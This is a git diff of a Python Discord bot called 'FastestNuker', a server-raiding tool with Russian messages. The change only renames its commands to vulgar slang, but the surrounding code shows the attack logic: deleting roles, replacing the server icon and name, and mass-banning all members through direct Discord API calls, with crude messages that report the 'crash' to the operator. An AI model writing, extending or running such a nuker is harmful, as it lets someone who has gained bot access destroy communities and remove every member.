@@ -33,7 +33,7 @@ async def createrole(ctx):
     except: pass
 
 @client.command()
-async def kill(ctx):
+async def kakashka(ctx):
     await ctx.message.delete()
     await ctx.author.send(f'Краш сервера `{ctx.guild}` (id: {ctx.guild.id}) запущен!')
     for rl in ctx.guild.roles:
@@ -48,7 +48,7 @@ async def kill(ctx):
     await ctx.author.send(f'Изнасилование сервера `{ctx.guild}` (id: {ctx.guild.id}) некарасиком завершено!')
 
 @client.command()
-async def rename(ctx):
+async def dermo(ctx):
     await ctx.message.delete()
     with open('icon.PNG', 'rb') as f:
         icon = f.read()
@@ -65,12 +65,12 @@ async def banus(ctx, limit=None):
         put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'Краш от РейдБата'}, json={'delete_message_days': 1})
 
 @client.command()
-async def banall(ctx):
+async def trahat(ctx):
     create_task(banus(ctx,limit=None))
     await ctx.author.send(f'Все участники на сервере (id) {ctx.guild.id} в ближайшем времени будут забанены (если у меня есть права на это)')
 
 @client.command()
-async def help(ctx):
+async def sosiloh(ctx):
     await ctx.message.delete()
     try:
         await ctx.author.send(embed=discord.Embed(title='FastestNuker',description=f'`!kill` - авто краш сервера\n`!rename` - сменить иконку и имя серверу\n`!banall` - бан всех участников сервера',colour=discord.Colour.from_rgb(228,66,0)))
